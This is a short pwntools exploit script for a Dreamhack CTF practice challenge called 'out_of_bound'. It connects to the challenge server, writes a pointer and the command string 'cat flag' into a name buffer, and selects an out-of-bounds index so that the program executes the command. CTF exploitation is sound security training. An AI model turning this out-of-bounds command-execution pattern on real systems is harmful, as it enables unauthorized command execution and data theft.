from pwn import *

context.terminal=['tmux', 'splitw', '-h']
context.arch = "amd64"
#p = process('./out_of_bound')
#gdb.attach(p)
p = remote("host3.dreamhack.games",16745)
name_addr = 0x804a0ac + 0x4
payload = b''
payload += p32(name_addr)
payload += b'cat flag'
p.sendafter("Admin name: ",payload)

p.sendlineafter(":",str(19))

p.interactive()

